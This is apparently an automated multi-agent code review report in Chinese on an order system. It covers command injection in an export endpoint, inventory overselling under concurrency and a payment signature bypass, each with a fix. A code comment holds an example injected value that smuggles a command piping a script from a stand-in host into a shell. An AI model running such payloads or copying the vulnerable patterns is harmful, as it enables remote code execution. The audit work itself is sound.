CRITICAL SecurityAgent

订单导出接口存在命令注入，可远程执行任意命令

app/api/export.pyL42–L48 
# 用户可控的 date_range 被直接拼进 shell 命令
def export_orders(request):
    date_range = request.args.get("range")
    out = f"/tmp/orders_{date_range}.csv"
    # 危险：date_range = "2026; curl evil.sh | sh"
    subprocess.call(f"python manage.py dumpdata orders > {out}", shell=True)
    return send_file(out)
影响：任何登录用户可通过构造 range 参数，在应用服务器上以进程权限执行任意命令。该接口暴露在公网且仅需普通账号。
修复：去掉 shell=True，改用参数列表；对 date_range 做白名单校验（只允许 ^\d{4}-\d{2}$）；输出路径改用 tempfile.mkstemp() 生成，不拼接用户输入。
关联：同文件 L51 的 os.system() 调用有相同模式，建议一并处理。
HIGH ConcurrencyAgent

库存扣减非原子操作，并发下单会超卖

app/services/inventory.pyL88–L96 
# 读-改-写 三步之间没有锁，也没有数据库层约束
stock = db.query(Item).get(item_id)      # 读到 5
if stock.quantity >= qty:                    # 另一个请求也读到 5
    stock.quantity -= qty                    # 两个请求都写回 3
    db.commit()                               # 实际卖出 4 件，库存只减 2
影响：大促期间必然超卖，导致订单无法履约与客诉。压测已能在 50 并发下复现。
修复：改为条件更新 UPDATE items SET quantity = quantity - :qty WHERE id = :id AND quantity >= :qty，以受影响行数判断成功；或加 SELECT ... FOR UPDATE。
HIGH SecurityAgent + ConfigAgent

支付回调验签可被绕过

位置：app/api/payment.py L120
问题：验签函数在密钥为空时直接 return True，而新环境的 PAYMENT_SECRET 默认为空字符串。一旦某环境漏配，伪造回调即可将订单置为已支付。
修复：密钥缺失时应 raise 而非放行；启动时做配置校验，缺失即拒绝启动。
说明：这条由两个 Agent 独立报出，Coordinator 合并为一条并保留 ConfigAgent 补充的“默认值”上下文。
